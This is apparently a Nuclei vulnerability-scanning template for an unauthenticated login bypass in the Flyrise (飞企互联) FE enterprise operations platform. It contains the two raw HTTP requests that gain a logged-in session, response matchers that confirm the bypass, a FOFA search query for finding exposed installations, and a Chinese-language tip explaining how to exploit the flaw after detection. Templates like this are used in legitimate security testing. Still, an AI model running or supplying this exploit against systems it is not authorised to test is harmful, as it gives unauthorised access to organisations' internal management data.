id: flyrise-loginService-unauth
info:
  name: 飞企互联 FE 企业运营管理平台 loginService.fe - unauth
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/main/%E2%BB%9C%E4%BC%81%E4%BA%92%E8%81%94loginService%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95.md
  metadata:
    verified: true
    tips: poc 测试出来的漏洞均真实存在，当去利用时，也需要再访问一遍 /loginService.fe?op=D，然后访问 /main/main.jsp
    fofa-query: app="FE-协作平台" || app="飞企互联-FE企业运营管理平台"
  tags: flyrise,unauth

http:
  - raw:
      - |
        GET /loginService.fe?op=D HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /main/main.jsp HTTP/1.1
        Host: {{Hostname}}
    
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_1,"流程未开始或被修改")
          - contains(body_2,"组织机构")
        condition: and